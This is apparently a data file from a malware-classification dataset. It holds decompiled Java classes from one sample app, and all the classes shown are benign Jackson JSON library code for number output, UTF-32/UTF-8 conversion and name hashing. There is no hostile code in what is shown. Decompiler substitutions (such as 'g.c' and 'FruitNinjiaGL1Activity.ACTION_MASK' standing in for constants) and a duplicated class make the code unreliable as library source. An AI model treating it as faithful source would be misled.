"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.io\NumberOutput.code","public final class NumberOutput {   private static final char NULL_CHAR=0;   static final String[] sSmallIntStrs;   static final String[] sSmallIntStrs2;   private static int MILLION=1000000;   private static int BILLION=1000000000;   private static long TEN_BILLION_L=10000000000L;   private static long THOUSAND_L=1000;   private static long MIN_INT_AS_LONG=-2147483648L;   private static long MAX_INT_AS_LONG=2147483647L;   static final String SMALLEST_LONG=String.valueOf(Long.MIN_VALUE);   static final char[] LEADING_TRIPLETS=new char[4000];   static final char[] FULL_TRIPLETS=new char[4000]; static {     int i1=0;     int ix=0;     while (i1 < 10) {       char f1=(char)(i1 + 48);       char l1=i1 == 0 ? (char)0 : f1;       int i2=0;       int i3=ix;       while (i2 < 10) {         char f2=(char)(i2 + 48);         char l2=(i1 == 0 && i2 == 0) ? (char)0 : f2;         int i32=0;         int ix2=i3;         while (true) {           int ix3=i32;           if (ix3 >= 10) {             break;           }           char f3=(char)(ix3 + 48);           LEADING_TRIPLETS[ix2]=l1;           LEADING_TRIPLETS[ix2 + 1]=l2;           LEADING_TRIPLETS[ix2 + 2]=f3;           FULL_TRIPLETS[ix2]=f1;           FULL_TRIPLETS[ix2 + 1]=f2;           FULL_TRIPLETS[ix2 + 2]=f3;           ix2+=4;           i32=ix3 + 1;         }         i2++;         i3=ix2;       }       i1++;       ix=i3;     }     sSmallIntStrs=new String[]{""0"",""1"",""2"",""3"",""4"",""5"",""6"",""7"",""8"",""9"",""10""};     sSmallIntStrs2=new String[]{""-1"",""-2"",""-3"",""-4"",""-5"",""-6"",""-7"",""-8"",""-9"",""-10""};   }   public static int outputInt(  int value,  char[] buffer,  int offset){     int offset2;     int offset3;     if (value < 0) {       if (value == Integer.MIN_VALUE) {         return outputLong(value,buffer,offset);       }       buffer[offset]='-';       value=-value;       offset++;     }     if (value < MILLION) {       if (value < 1000) {         if (value < 10) {           buffer[offset]=(char)(value + 48);           offset3=offset + 1;         }  else {           offset3=outputLeadingTriplet(value,buffer,offset);         }       }  else {         int thousands=value / 1000;         offset3=outputFullTriplet(value - (thousands * 1000),buffer,outputLeadingTriplet(thousands,buffer,offset));       }       return offset3;     }     boolean hasBillions=value >= BILLION;     if (hasBillions) {       value-=BILLION;       if (value >= BILLION) {         value-=BILLION;         buffer[offset]='2';         offset++;       }  else {         buffer[offset]='1';         offset++;       }     }     int newValue=value / 1000;     int ones=value - (newValue * 1000);     int newValue2=newValue / 1000;     int thousands2=newValue - (newValue2 * 1000);     if (hasBillions) {       offset2=outputFullTriplet(newValue2,buffer,offset);     }  else {       offset2=outputLeadingTriplet(newValue2,buffer,offset);     }     return outputFullTriplet(ones,buffer,outputFullTriplet(thousands2,buffer,offset2));   }   public static int outputLong(  long value,  char[] buffer,  int offset){     if (value < 0) {       if (value > MIN_INT_AS_LONG) {         return outputInt((int)value,buffer,offset);       }       if (value == Long.MIN_VALUE) {         int len=SMALLEST_LONG.length();         SMALLEST_LONG.getChars(0,len,buffer,offset);         return offset + len;       }       buffer[offset]='-';       value=-value;       offset++;     }  else     if (value <= MAX_INT_AS_LONG) {       return outputInt((int)value,buffer,offset);     }     int origOffset=offset;     int offset2=offset + calcLongStrLength(value);     int ptr=offset2;     while (value > MAX_INT_AS_LONG) {       ptr-=3;       long newValue=value / THOUSAND_L;       int triplet=(int)(value - (THOUSAND_L * newValue));       outputFullTriplet(triplet,buffer,ptr);       value=newValue;     }     int ivalue=(int)value;     while (ivalue >= 1000) {       ptr-=3;       int newValue2=ivalue / 1000;       int triplet2=ivalue - (newValue2 * 1000);       outputFullTriplet(triplet2,buffer,ptr);       ivalue=newValue2;     }     outputLeadingTriplet(ivalue,buffer,origOffset);     return offset2;   }   public static String toString(  int value){     if (value < sSmallIntStrs.length) {       if (value >= 0) {         return sSmallIntStrs[value];       }       int v2=(-value) - 1;       if (v2 < sSmallIntStrs2.length) {         return sSmallIntStrs2[v2];       }     }     return Integer.toString(value);   }   public static String toString(  long value){     return (value > 2147483647L || value < -2147483648L) ? Long.toString(value) : toString((int)value);   }   public static String toString(  double value){     return Double.toString(value);   }   private static int outputLeadingTriplet(  int triplet,  char[] buffer,  int offset){     int digitOffset=triplet << 2;     int digitOffset2=digitOffset + 1;     char c=LEADING_TRIPLETS[digitOffset];     if (c != 0) {       buffer[offset]=c;       offset++;     }     int digitOffset3=digitOffset2 + 1;     char c2=LEADING_TRIPLETS[digitOffset2];     if (c2 != 0) {       buffer[offset]=c2;       offset++;     }     int offset2=offset + 1;     buffer[offset]=LEADING_TRIPLETS[digitOffset3];     return offset2;   }   private static int outputFullTriplet(  int triplet,  char[] buffer,  int offset){     int digitOffset=triplet << 2;     int offset2=offset + 1;     int digitOffset2=digitOffset + 1;     buffer[offset]=FULL_TRIPLETS[digitOffset];     int offset3=offset2 + 1;     buffer[offset2]=FULL_TRIPLETS[digitOffset2];     int offset4=offset3 + 1;     buffer[offset3]=FULL_TRIPLETS[digitOffset2 + 1];     return offset4;   }   private static int calcLongStrLength(  long posValue){     int len=10;     for (long comp=TEN_BILLION_L; posValue >= comp && len != 19; comp=(comp << 3) + (comp << 1)) {       len++;     }     return len;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.io\UTF32Reader.code","public final class UTF32Reader extends BaseReader {   final boolean mBigEndian;   int mByteCount;   int mCharCount;   char mSurrogate;   @Override public void close() throws IOException {     super.close();   }   @Override public int read() throws IOException {     return super.read();   }   public UTF32Reader(  IOContext ctxt,  InputStream in,  byte[] buf,  int ptr,  int len,  boolean isBigEndian){     super(ctxt,in,buf,ptr,len);     this.mSurrogate=(char)0;     this.mCharCount=0;     this.mByteCount=0;     this.mBigEndian=isBigEndian;   }   @Override public int read(  char[] cbuf,  int start,  int len) throws IOException {     int outPtr;     int outPtr2;     int ch;     if (this.mBuffer == null) {       return -1;     }     if (len < 1) {       return len;     }     if (start < 0 || start + len > cbuf.length) {       reportBounds(cbuf,start,len);     }     int len2=len + start;     if (this.mSurrogate != 0) {       outPtr=start + 1;       cbuf[start]=this.mSurrogate;       this.mSurrogate=(char)0;     }  else {       int left=this.mLength - this.mPtr;       if (left < 4 && !loadMore(left)) {         return -1;       }       outPtr=start;     }     while (true) {       if (outPtr >= len2) {         outPtr2=outPtr;         break;       }       int ptr=this.mPtr;       if (this.mBigEndian) {         ch=(this.mBuffer[ptr] << 24) | ((this.mBuffer[ptr + 1] & 255) << 16) | ((this.mBuffer[ptr + 2] & 255) << 8)| (this.mBuffer[ptr + 3] & 255);       }  else {         ch=(this.mBuffer[ptr] & 255) | ((this.mBuffer[ptr + 1] & 255) << 8) | ((this.mBuffer[ptr + 2] & 255) << 16)| (this.mBuffer[ptr + 3] << 24);       }       this.mPtr+=4;       if (ch > 65535) {         if (ch > 1114111) {           reportInvalid(ch,outPtr - start,""(above "" + Integer.toHexString(1114111) + "") "");         }         int ch2=ch - 65536;         outPtr2=outPtr + 1;         cbuf[outPtr]=(char)(55296 + (ch2 >> 10));         ch=56320 | (ch2 & 1023);         if (outPtr2 >= len2) {           this.mSurrogate=(char)ch;           break;         }       }  else {         outPtr2=outPtr;       }       outPtr=outPtr2 + 1;       cbuf[outPtr2]=(char)ch;       if (this.mPtr >= this.mLength) {         outPtr2=outPtr;         break;       }     }     int len3=outPtr2 - start;     this.mCharCount+=len3;     return len3;   }   private void reportUnexpectedEOF(  int gotBytes,  int needed) throws IOException {     int bytePos=this.mByteCount + gotBytes;     int charPos=this.mCharCount;     throw new CharConversionException(""Unexpected EOF in the middle of a 4-byte UTF-32 char: got "" + gotBytes + "", needed ""+ needed+ "", at char #""+ charPos+ "", byte #""+ bytePos+ "")"");   }   private void reportInvalid(  int value,  int offset,  String msg) throws IOException {     int bytePos=(this.mByteCount + this.mPtr) - 1;     int charPos=this.mCharCount + offset;     throw new CharConversionException(""Invalid UTF-32 character 0x"" + Integer.toHexString(value) + msg+ "" at char #""+ charPos+ "", byte #""+ bytePos+ "")"");   }   private boolean loadMore(  int available) throws IOException {     this.mByteCount+=this.mLength - available;     if (available > 0) {       if (this.mPtr > 0) {         for (int i=0; i < available; i++) {           this.mBuffer[i]=this.mBuffer[this.mPtr + i];         }         this.mPtr=0;       }       this.mLength=available;     }  else {       this.mPtr=0;       int count=this.mIn.read(this.mBuffer);       if (count < 1) {         this.mLength=0;         if (count < 0) {           freeBuffers();           return false;         }         reportStrangeStream();       }       this.mLength=count;     }     while (this.mLength < 4) {       int count2=this.mIn.read(this.mBuffer,this.mLength,this.mBuffer.length - this.mLength);       if (count2 < 1) {         if (count2 < 0) {           freeBuffers();           reportUnexpectedEOF(this.mLength,4);         }         reportStrangeStream();       }       this.mLength+=count2;     }     return true;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.io\UTF8Writer.code","public final class UTF8Writer extends Writer {   static final int SURR1_FIRST=55296;   static final int SURR1_LAST=56319;   static final int SURR2_FIRST=56320;   static final int SURR2_LAST=57343;   protected final IOContext mContext;   OutputStream mOut;   byte[] mOutBuffer;   final int mOutBufferLast;   int mSurrogate=0;   int mOutPtr=0;   public UTF8Writer(  IOContext ctxt,  OutputStream out){     this.mContext=ctxt;     this.mOut=out;     this.mOutBuffer=ctxt.allocWriteEncodingBuffer();     this.mOutBufferLast=this.mOutBuffer.length - 4;   }   @Override public Writer append(  char c) throws IOException {     write(c);     return this;   }   @Override public void close() throws IOException {     if (this.mOut != null) {       if (this.mOutPtr > 0) {         this.mOut.write(this.mOutBuffer,0,this.mOutPtr);         this.mOutPtr=0;       }       OutputStream out=this.mOut;       this.mOut=null;       byte[] buf=this.mOutBuffer;       if (buf != null) {         this.mOutBuffer=null;         this.mContext.releaseWriteEncodingBuffer(buf);       }       out.close();       int code=this.mSurrogate;       this.mSurrogate=0;       if (code > 0) {         throwIllegal(code);       }     }   }   @Override public void flush() throws IOException {     if (this.mOutPtr > 0) {       this.mOut.write(this.mOutBuffer,0,this.mOutPtr);       this.mOutPtr=0;     }     this.mOut.flush();   }   @Override public void write(  char[] cbuf) throws IOException {     write(cbuf,0,cbuf.length);   }   @Override public void write(  char[] cbuf,  int off,  int len) throws IOException {     int outPtr;     if (len < 2) {       if (len == 1) {         write(cbuf[off]);         return;       }       return;     }     if (this.mSurrogate > 0) {       char second=cbuf[off];       len--;       write(convertSurrogate(second));       off++;     }     int outPtr2=this.mOutPtr;     byte[] outBuf=this.mOutBuffer;     int outBufLast=this.mOutBufferLast;     int len2=len + off;     int off2=off;     while (true) {       if (off2 >= len2) {         break;       }       if (outPtr2 >= outBufLast) {         this.mOut.write(outBuf,0,outPtr2);         outPtr2=0;       }       int off3=off2 + 1;       char c=cbuf[off2];       if (c < 128) {         outPtr=outPtr2 + 1;         outBuf[outPtr2]=(byte)c;         int maxInCount=len2 - off3;         int maxOutCount=outBufLast - outPtr;         if (maxInCount > maxOutCount) {           maxInCount=maxOutCount;         }         int maxInCount2=maxInCount + off3;         off2=off3;         while (off2 < maxInCount2) {           int off4=off2 + 1;           c=cbuf[off2];           if (c >= 128) {             off2=off4;           }  else {             outBuf[outPtr]=(byte)c;             outPtr++;             off2=off4;           }         }         outPtr2=outPtr;       }  else {         outPtr=outPtr2;         off2=off3;       }       if (c < 2048) {         int outPtr3=outPtr + 1;         outBuf[outPtr]=(byte)((c >> 6) | 192);         outBuf[outPtr3]=(byte)((c & '?') | g.c);         outPtr2=outPtr3 + 1;       }  else       if (c < SURR1_FIRST || c > SURR2_LAST) {         int outPtr4=outPtr + 1;         outBuf[outPtr]=(byte)((c >> '\f') | 224);         int outPtr5=outPtr4 + 1;         outBuf[outPtr4]=(byte)(((c >> 6) & 63) | g.c);         outPtr2=outPtr5 + 1;         outBuf[outPtr5]=(byte)((c & '?') | g.c);       }  else {         if (c > SURR1_LAST) {           this.mOutPtr=outPtr;           throwIllegal(c);         }         this.mSurrogate=c;         if (off2 >= len2) {           outPtr2=outPtr;           break;         }         int off5=off2 + 1;         int c2=convertSurrogate(cbuf[off2]);         if (c2 > 1114111) {           this.mOutPtr=outPtr;           throwIllegal(c2);         }         int outPtr6=outPtr + 1;         outBuf[outPtr]=(byte)((c2 >> 18) | 240);         int outPtr7=outPtr6 + 1;         outBuf[outPtr6]=(byte)(((c2 >> 12) & 63) | g.c);         int outPtr8=outPtr7 + 1;         outBuf[outPtr7]=(byte)(((c2 >> 6) & 63) | g.c);         outBuf[outPtr8]=(byte)((c2 & 63) | g.c);         outPtr2=outPtr8 + 1;         off2=off5;       }     }     this.mOutPtr=outPtr2;   }   @Override public void write(  int c) throws IOException {     int ptr;     if (this.mSurrogate > 0) {       c=convertSurrogate(c);     }  else     if (c >= SURR1_FIRST && c <= SURR2_LAST) {       if (c > SURR1_LAST) {         throwIllegal(c);       }       this.mSurrogate=c;       return;     }     if (this.mOutPtr >= this.mOutBufferLast) {       this.mOut.write(this.mOutBuffer,0,this.mOutPtr);       this.mOutPtr=0;     }     if (c < 128) {       byte[] bArr=this.mOutBuffer;       int i=this.mOutPtr;       this.mOutPtr=i + 1;       bArr[i]=(byte)c;       return;     }     int ptr2=this.mOutPtr;     if (c < 2048) {       int ptr3=ptr2 + 1;       this.mOutBuffer[ptr2]=(byte)((c >> 6) | 192);       ptr=ptr3 + 1;       this.mOutBuffer[ptr3]=(byte)((c & 63) | g.c);     }  else     if (c <= 65535) {       int ptr4=ptr2 + 1;       this.mOutBuffer[ptr2]=(byte)((c >> 12) | 224);       int ptr5=ptr4 + 1;       this.mOutBuffer[ptr4]=(byte)(((c >> 6) & 63) | g.c);       this.mOutBuffer[ptr5]=(byte)((c & 63) | g.c);       ptr=ptr5 + 1;     }  else {       if (c > 1114111) {         throwIllegal(c);       }       int ptr6=ptr2 + 1;       this.mOutBuffer[ptr2]=(byte)((c >> 18) | 240);       int ptr7=ptr6 + 1;       this.mOutBuffer[ptr6]=(byte)(((c >> 12) & 63) | g.c);       int ptr8=ptr7 + 1;       this.mOutBuffer[ptr7]=(byte)(((c >> 6) & 63) | g.c);       ptr=ptr8 + 1;       this.mOutBuffer[ptr8]=(byte)((c & 63) | g.c);     }     this.mOutPtr=ptr;   }   @Override public void write(  String str) throws IOException {     write(str,0,str.length());   }   @Override public void write(  String str,  int off,  int len) throws IOException {     int outPtr;     if (len < 2) {       if (len == 1) {         write(str.charAt(off));         return;       }       return;     }     if (this.mSurrogate > 0) {       char second=str.charAt(off);       len--;       write(convertSurrogate(second));       off++;     }     int outPtr2=this.mOutPtr;     byte[] outBuf=this.mOutBuffer;     int outBufLast=this.mOutBufferLast;     int len2=len + off;     int off2=off;     while (true) {       if (off2 >= len2) {         break;       }       if (outPtr2 >= outBufLast) {         this.mOut.write(outBuf,0,outPtr2);         outPtr2=0;       }       int off3=off2 + 1;       int c=str.charAt(off2);       if (c < 128) {         outPtr=outPtr2 + 1;         outBuf[outPtr2]=(byte)c;         int maxInCount=len2 - off3;         int maxOutCount=outBufLast - outPtr;         if (maxInCount > maxOutCount) {           maxInCount=maxOutCount;         }         int maxInCount2=maxInCount + off3;         off2=off3;         while (off2 < maxInCount2) {           int off4=off2 + 1;           c=str.charAt(off2);           if (c >= 128) {             off2=off4;           }  else {             outBuf[outPtr]=(byte)c;             outPtr++;             off2=off4;           }         }         outPtr2=outPtr;       }  else {         outPtr=outPtr2;         off2=off3;       }       if (c < 2048) {         int outPtr3=outPtr + 1;         outBuf[outPtr]=(byte)((c >> 6) | 192);         outBuf[outPtr3]=(byte)((c & 63) | g.c);         outPtr2=outPtr3 + 1;       }  else       if (c < SURR1_FIRST || c > SURR2_LAST) {         int outPtr4=outPtr + 1;         outBuf[outPtr]=(byte)((c >> 12) | 224);         int outPtr5=outPtr4 + 1;         outBuf[outPtr4]=(byte)(((c >> 6) & 63) | g.c);         outPtr2=outPtr5 + 1;         outBuf[outPtr5]=(byte)((c & 63) | g.c);       }  else {         if (c > SURR1_LAST) {           this.mOutPtr=outPtr;           throwIllegal(c);         }         this.mSurrogate=c;         if (off2 >= len2) {           outPtr2=outPtr;           break;         }         int off5=off2 + 1;         int c2=convertSurrogate(str.charAt(off2));         if (c2 > 1114111) {           this.mOutPtr=outPtr;           throwIllegal(c2);         }         int outPtr6=outPtr + 1;         outBuf[outPtr]=(byte)((c2 >> 18) | 240);         int outPtr7=outPtr6 + 1;         outBuf[outPtr6]=(byte)(((c2 >> 12) & 63) | g.c);         int outPtr8=outPtr7 + 1;         outBuf[outPtr7]=(byte)(((c2 >> 6) & 63) | g.c);         outBuf[outPtr8]=(byte)((c2 & 63) | g.c);         outPtr2=outPtr8 + 1;         off2=off5;       }     }     this.mOutPtr=outPtr2;   }   private int convertSurrogate(  int secondPart) throws IOException {     int firstPart=this.mSurrogate;     this.mSurrogate=0;     if (secondPart < SURR2_FIRST || secondPart > SURR2_LAST) {       throw new IOException(""Broken surrogate pair: first char 0x"" + Integer.toHexString(firstPart) + "", second 0x""+ Integer.toHexString(secondPart)+ ""; illegal combination"");     }     return 65536 + ((firstPart - SURR1_FIRST) << 10) + (secondPart - SURR2_FIRST);   }   private void throwIllegal(  int code) throws IOException {     if (code > 1114111) {       throw new IOException(""Illegal character point (0x"" + Integer.toHexString(code) + "") to output; max is 0x10FFFF as per RFC 4627"");     }     if (code >= SURR1_FIRST) {       if (code <= SURR1_LAST) {         throw new IOException(""Unmatched first part of surrogate pair (0x"" + Integer.toHexString(code) + "")"");       }       throw new IOException(""Unmatched second part of surrogate pair (0x"" + Integer.toHexString(code) + "")"");     }     throw new IOException(""Illegal character point (0x"" + Integer.toHexString(code) + "") to output"");   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.sym\Bucket.code","public static final class Bucket {   final Name mName;   final Bucket mNext;   Bucket(  Name name,  Bucket next){     this.mName=name;     this.mNext=next;   }   public int length(){     int len=1;     for (Bucket curr=this.mNext; curr != null; curr=curr.mNext) {       len++;     }     return len;   }   public Name find(  int hash,  int firstQuad,  int secondQuad){     if (this.mName.hashCode() == hash && this.mName.equals(firstQuad,secondQuad)) {       return this.mName;     }     for (Bucket curr=this.mNext; curr != null; curr=curr.mNext) {       Name currName=curr.mName;       if (currName.hashCode() == hash && currName.equals(firstQuad,secondQuad)) {         return currName;       }     }     return null;   }   public Name find(  int hash,  int[] quads,  int qlen){     if (this.mName.hashCode() == hash && this.mName.equals(quads,qlen)) {       return this.mName;     }     for (Bucket curr=this.mNext; curr != null; curr=curr.mNext) {       Name currName=curr.mName;       if (currName.hashCode() == hash && currName.equals(quads,qlen)) {         return currName;       }     }     return null;   } } public static final class Bucket {   private final String _symbol;   private final Bucket mNext;   public Bucket(  String symbol,  Bucket next){     this._symbol=symbol;     this.mNext=next;   }   public String getSymbol(){     return this._symbol;   }   public Bucket getNext(){     return this.mNext;   }   public String find(  char[] buf,  int start,  int len){     String sym=this._symbol;     Bucket b=this.mNext;     while (true) {       if (sym.length() == len) {         int i=0;         while (sym.charAt(i) == buf[start + i] && (i=i + 1) < len) {         }         if (i == len) {           return sym;         }       }       if (b != null) {         sym=b.getSymbol();         b=b.getNext();       }  else {         return null;       }     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.sym\BytesToNameCanonicalizer.code","public final class BytesToNameCanonicalizer {   protected static final int DEFAULT_TABLE_SIZE=64;   static final int INITIAL_COLLISION_LEN=32;   static final int LAST_VALID_BUCKET=254;   static final int MAX_ENTRIES_FOR_REUSE=6000;   protected static final int MAX_TABLE_SIZE=65536;   static final int MIN_HASH_SIZE=16;   private int _collCount;   private int _collEnd;   private Bucket[] _collList;   private boolean _collListShared;   private int _count;   final boolean _intern;   private int[] _mainHash;   private int _mainHashMask;   private boolean _mainHashShared;   private Name[] _mainNames;   private boolean _mainNamesShared;   private transient boolean _needRehash;   final BytesToNameCanonicalizer _parent;   public static BytesToNameCanonicalizer createRoot(){     return new BytesToNameCanonicalizer(64,true);   }   public synchronized BytesToNameCanonicalizer makeChild(  boolean canonicalize,  boolean intern){     return new BytesToNameCanonicalizer(this,intern);   }   public void release(){     if (maybeDirty() && this._parent != null) {       this._parent.mergeChild(this);       markAsShared();     }   }   private BytesToNameCanonicalizer(  int hashSize,  boolean intern){     this._parent=null;     this._intern=intern;     if (hashSize < 16) {       hashSize=16;     }  else     if (((hashSize - 1) & hashSize) != 0) {       int curr=16;       while (curr < hashSize) {         curr+=curr;       }       hashSize=curr;     }     initTables(hashSize);   }   private BytesToNameCanonicalizer(  BytesToNameCanonicalizer parent,  boolean intern){     this._parent=parent;     this._intern=intern;     this._count=parent._count;     this._mainHashMask=parent._mainHashMask;     this._mainHash=parent._mainHash;     this._mainNames=parent._mainNames;     this._collList=parent._collList;     this._collCount=parent._collCount;     this._collEnd=parent._collEnd;     this._needRehash=false;     this._mainHashShared=true;     this._mainNamesShared=true;     this._collListShared=true;   }   private void initTables(  int hashSize){     this._count=0;     this._mainHash=new int[hashSize];     this._mainNames=new Name[hashSize];     this._mainHashShared=false;     this._mainNamesShared=false;     this._mainHashMask=hashSize - 1;     this._collListShared=true;     this._collList=null;     this._collEnd=0;     this._needRehash=false;   }   private synchronized void mergeChild(  BytesToNameCanonicalizer child){     int childCount=child._count;     if (childCount > this._count) {       if (child.size() > MAX_ENTRIES_FOR_REUSE) {         initTables(64);       }  else {         this._count=child._count;         this._mainHash=child._mainHash;         this._mainNames=child._mainNames;         this._mainHashShared=true;         this._mainNamesShared=true;         this._mainHashMask=child._mainHashMask;         this._collList=child._collList;         this._collCount=child._collCount;         this._collEnd=child._collEnd;       }     }   }   private void markAsShared(){     this._mainHashShared=true;     this._mainNamesShared=true;     this._collListShared=true;   }   public int size(){     return this._count;   }   public boolean maybeDirty(){     return !this._mainHashShared;   }   public static Name getEmptyName(){     return Name1.getEmptyName();   }   public Name findName(  int firstQuad){     int hash=calcHash(firstQuad);     int ix=hash & this._mainHashMask;     int val=this._mainHash[ix];     if ((((val >> 8) ^ hash) << 8) == 0) {       Name name=this._mainNames[ix];       if (name == null) {         return null;       }       if (name.equals(firstQuad)) {         return name;       }     }  else     if (val == 0) {       return null;     }     int val2=val & FruitNinjiaGL1Activity.ACTION_MASK;     if (val2 > 0) {       Bucket bucket=this._collList[val2 - 1];       if (bucket != null) {         return bucket.find(hash,firstQuad,0);       }     }     return null;   }   public Name findName(  int firstQuad,  int secondQuad){     int hash=calcHash(firstQuad,secondQuad);     int ix=hash & this._mainHashMask;     int val=this._mainHash[ix];     if ((((val >> 8) ^ hash) << 8) == 0) {       Name name=this._mainNames[ix];       if (name == null) {         return null;       }       if (name.equals(firstQuad,secondQuad)) {         return name;       }     }  else     if (val == 0) {       return null;     }     int val2=val & FruitNinjiaGL1Activity.ACTION_MASK;     if (val2 > 0) {       Bucket bucket=this._collList[val2 - 1];       if (bucket != null) {         return bucket.find(hash,firstQuad,secondQuad);       }     }     return null;   }   public Name findName(  int[] quads,  int qlen){     int hash=calcHash(quads,qlen);     int ix=hash & this._mainHashMask;     int val=this._mainHash[ix];     if ((((val >> 8) ^ hash) << 8) == 0) {       Name name=this._mainNames[ix];       if (name == null || name.equals(quads,qlen)) {         return name;       }     }  else     if (val == 0) {       return null;     }     int val2=val & FruitNinjiaGL1Activity.ACTION_MASK;     if (val2 > 0) {       Bucket bucket=this._collList[val2 - 1];       if (bucket != null) {         return bucket.find(hash,quads,qlen);       }     }     return null;   }   public Name addName(  String symbolStr,  int[] quads,  int qlen){     if (this._intern) {       symbolStr=InternCache.instance.intern(symbolStr);     }     int hash=calcHash(quads,qlen);     Name symbol=constructName(hash,symbolStr,quads,qlen);     _addSymbol(hash,symbol);     return symbol;   }   public static final int calcHash(  int firstQuad){     int hash=firstQuad ^ (firstQuad >>> 16);     return hash ^ (hash >>> 8);   }   public static final int calcHash(  int firstQuad,  int secondQuad){     int hash=(firstQuad * 31) + secondQuad;     int hash2=hash ^ (hash >>> 16);     return hash2 ^ (hash2 >>> 8);   }   public static final int calcHash(  int[] quads,  int qlen){     int hash=quads[0];     for (int i=1; i < qlen; i++) {       hash=(hash * 31) + quads[i];     }     int hash2=hash ^ (hash >>> 16);     return hash2 ^ (hash2 >>> 8);   }   private void _addSymbol(  int hash,  Name symbol){     int bucket;     if (this._mainHashShared) {       unshareMain();     }     if (this._needRehash) {       rehash();     }     this._count++;     int ix=hash & this._mainHashMask;     if (this._mainNames[ix] == null) {       this._mainHash[ix]=hash << 8;       if (this._mainNamesShared) {         unshareNames();       }       this._mainNames[ix]=symbol;     }  else {       if (this._collListShared) {         unshareCollision();       }       this._collCount++;       int entryValue=this._mainHash[ix];       int bucket2=entryValue & FruitNinjiaGL1Activity.ACTION_MASK;       if (bucket2 == 0) {         if (this._collEnd <= LAST_VALID_BUCKET) {           bucket=this._collEnd;           this._collEnd++;           if (bucket >= this._collList.length) {             expandCollision();           }         }  else {           bucket=findBestBucket();         }         this._mainHash[ix]=(entryValue & (-256)) | (bucket + 1);       }  else {         bucket=bucket2 - 1;       }       this._collList[bucket]=new Bucket(symbol,this._collList[bucket]);     }     int hashSize=this._mainHash.length;     if (this._count > (hashSize >> 1)) {       int hashQuarter=hashSize >> 2;       if (this._count > hashSize - hashQuarter) {         this._needRehash=true;       }  else       if (this._collCount >= hashQuarter) {         this._needRehash=true;       }     }   }   private void rehash(){     int bucket;     this._needRehash=false;     this._mainNamesShared=false;     int[] oldMainHash=this._mainHash;     int len=oldMainHash.length;     int newLen=len + len;     if (newLen > MAX_TABLE_SIZE) {       nukeSymbols();       return;     }     this._mainHash=new int[newLen];     this._mainHashMask=newLen - 1;     Name[] oldNames=this._mainNames;     this._mainNames=new Name[newLen];     int symbolsSeen=0;     for (int i=0; i < len; i++) {       Name symbol=oldNames[i];       if (symbol != null) {         symbolsSeen++;         int hash=symbol.hashCode();         int ix=hash & this._mainHashMask;         this._mainNames[ix]=symbol;         this._mainHash[ix]=hash << 8;       }     }     int oldEnd=this._collEnd;     if (oldEnd != 0) {       this._collCount=0;       this._collEnd=0;       this._collListShared=false;       Bucket[] oldBuckets=this._collList;       this._collList=new Bucket[oldBuckets.length];       for (int i2=0; i2 < oldEnd; i2++) {         for (Bucket curr=oldBuckets[i2]; curr != null; curr=curr.mNext) {           symbolsSeen++;           Name symbol2=curr.mName;           int hash2=symbol2.hashCode();           int ix2=hash2 & this._mainHashMask;           int val=this._mainHash[ix2];           if (this._mainNames[ix2] == null) {             this._mainHash[ix2]=hash2 << 8;             this._mainNames[ix2]=symbol2;           }  else {             this._collCount++;             int bucket2=val & FruitNinjiaGL1Activity.ACTION_MASK;             if (bucket2 == 0) {               if (this._collEnd <= LAST_VALID_BUCKET) {                 bucket=this._collEnd;                 this._collEnd++;                 if (bucket >= this._collList.length) {                   expandCollision();                 }               }  else {                 bucket=findBestBucket();               }               this._mainHash[ix2]=(val & (-256)) | (bucket + 1);             }  else {               bucket=bucket2 - 1;             }             this._collList[bucket]=new Bucket(symbol2,this._collList[bucket]);           }         }       }       if (symbolsSeen != this._count) {         throw new RuntimeException(""Internal error: count after rehash "" + symbolsSeen + ""; should be ""+ this._count);       }     }   }   private void nukeSymbols(){     this._count=0;     Arrays.fill(this._mainHash,0);     Arrays.fill(this._mainNames,(Object)null);     Arrays.fill(this._collList,(Object)null);     this._collCount=0;     this._collEnd=0;   }   private int findBestBucket(){     Bucket[] buckets=this._collList;     int bestCount=Integer.MAX_VALUE;     int bestIx=-1;     int len=this._collEnd;     for (int i=0; i < len; i++) {       int count=buckets[i].length();       if (count < bestCount) {         if (count == 1) {           return i;         }         bestCount=count;         bestIx=i;       }     }     return bestIx;   }   private void unshareMain(){     int[] old=this._mainHash;     int len=this._mainHash.length;     this._mainHash=new int[len];     System.arraycopy(old,0,this._mainHash,0,len);     this._mainHashShared=false;   }   private void unshareCollision(){     Bucket[] old=this._collList;     if (old == null) {       this._collList=new Bucket[32];     }  else {       int len=old.length;       this._collList=new Bucket[len];       System.arraycopy(old,0,this._collList,0,len);     }     this._collListShared=false;   }   private void unshareNames(){     Name[] old=this._mainNames;     int len=old.length;     this._mainNames=new Name[len];     System.arraycopy(old,0,this._mainNames,0,len);     this._mainNamesShared=false;   }   private void expandCollision(){     Bucket[] old=this._collList;     int len=old.length;     this._collList=new Bucket[len + len];     System.arraycopy(old,0,this._collList,0,len);   }   private static Name constructName(  int hash,  String name,  int[] quads,  int qlen){     if (qlen < 4) { switch (qlen) { case 1:         return new Name1(name,hash,quads[0]); case 2:       return new Name2(name,hash,quads[0],quads[1]); case 3:     return new Name3(name,hash,quads[0],quads[1],quads[2]); } } int[] buf=new int[qlen]; for (int i=0; i < qlen; i++) { buf[i]=quads[i]; } return new NameN(name,hash,buf,qlen); } public static final class Bucket { final Name mName; final Bucket mNext; Bucket(Name name,Bucket next){ this.mName=name; this.mNext=next; } public int length(){ int len=1; for (Bucket curr=this.mNext; curr != null; curr=curr.mNext) {   len++; } return len; } public Name find(int hash,int firstQuad,int secondQuad){ if (this.mName.hashCode() == hash && this.mName.equals(firstQuad,secondQuad)) {   return this.mName; } for (Bucket curr=this.mNext; curr != null; curr=curr.mNext) {   Name currName=curr.mName;   if (currName.hashCode() == hash && currName.equals(firstQuad,secondQuad)) {     return currName;   } } return null; } public Name find(int hash,int[] quads,int qlen){ if (this.mName.hashCode() == hash && this.mName.equals(quads,qlen)) {   return this.mName; } for (Bucket curr=this.mNext; curr != null; curr=curr.mNext) {   Name 